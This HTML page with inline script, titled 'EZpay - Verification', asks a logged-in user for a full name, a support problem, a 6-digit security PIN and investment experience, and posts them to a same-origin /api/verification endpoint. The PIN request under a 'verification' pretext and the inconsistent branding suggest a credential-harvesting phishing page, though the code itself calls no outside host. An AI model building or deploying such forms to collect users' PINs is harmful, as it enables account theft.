<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EZpay - Verification</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="header-gradient">
        <h1>Welcome to E-Zpay</h1>
        <p>Please complete your verification</p>
    </div>

    <div class="container" style="margin-top: -20px;">
        <div class="card">
            <div id="error-msg" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>

            <form id="verificationForm">
                <div class="form-group">
                    <label class="form-label">Full Name</label>
                    <input type="text" id="full_name" class="form-control" placeholder="Enter full name" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Problem</label>
                    <div class="input-group">
                        <select id="problem" class="form-control" required style="appearance: none;">
                            <option value="" disabled selected>Select issue</option>
                            <option value="Id auto Logout">Id auto Logout</option>
                            <option value="Slow sell">Slow sell</option>
                            <option value="Quote not added">Quote not added</option>
                            <option value="Tool auto deauthorized">Tool auto deauthorized</option>
                        </select>
                        <span
                            style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">‚ñº</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Security PIN (6 Digits)</label>
                    <div class="input-group">
                        <input type="password" id="pin" class="form-control" placeholder="Enter 6-digit PIN" required
                            pattern="[0-9]{6}" maxlength="6">
                        <span class="toggle-password" onclick="togglePassword('pin')">üëÅÔ∏è</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Investment Experience</label>
                    <div class="input-group">
                        <select id="experience" class="form-control" required style="appearance: none;">
                            <option value="" disabled selected>Select experience</option>
                            <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
                            <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
                            <option value="Experienced (3-5 years)">Experienced (3-5 years)</option>
                            <option value="Expert (5+ years)">Expert (5+ years)</option>
                        </select>
                        <span
                            style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">‚ñº</span>
                    </div>
                </div>

                <button type="submit" id="submitBtn" class="btn btn-primary">SUBMIT VERIFICATION</button>
            </form>
        </div>
    </div>

    <script>
        // Check Session
        const userId = localStorage.getItem('ezpay_user_id');
        if (!userId) {
            window.location.href = 'login.html';
        }

        function togglePassword(id) {
            const input = document.getElementById(id);
            if (input.type === "password") {
                input.type = "text";
            } else {
                input.type = "password";
            }
        }

        document.getElementById('verificationForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const fullName = document.getElementById('full_name').value;
            const pin = document.getElementById('pin').value;
            const errorMsg = document.getElementById('error-msg');
            const btn = document.getElementById('submitBtn');

            if (pin.length !== 6) {
                errorMsg.textContent = "Security PIN must be 6 digits.";
                errorMsg.style.display = 'block';
                return;
            }

            // API Call
            btn.innerHTML = "Submitting...";
            btn.disabled = true;

            const verificationData = {
                user_id: userId,
                full_name: fullName,
                problem: document.getElementById('problem').value,
                pin: pin,
                experience: document.getElementById('experience').value
            };

            try {
                const response = await fetch('/api/verification', {
                    method: 'POST',
                    body: JSON.stringify(verificationData)
                });

                const result = await response.json();

                if (response.ok && result.success) {
                    window.location.href = 'thankyou.html';
                } else {
                    errorMsg.textContent = result.error || "Submission failed";
                    errorMsg.style.display = 'block';
                    btn.innerHTML = "SUBMIT VERIFICATION";
                    btn.disabled = false;
                }
            } catch (err) {
                errorMsg.textContent = "Connection error. Please try again.";
                errorMsg.style.display = 'block';
                btn.innerHTML = "SUBMIT VERIFICATION";
                btn.disabled = false;
            }
        });
    </script>
</body>

</html>
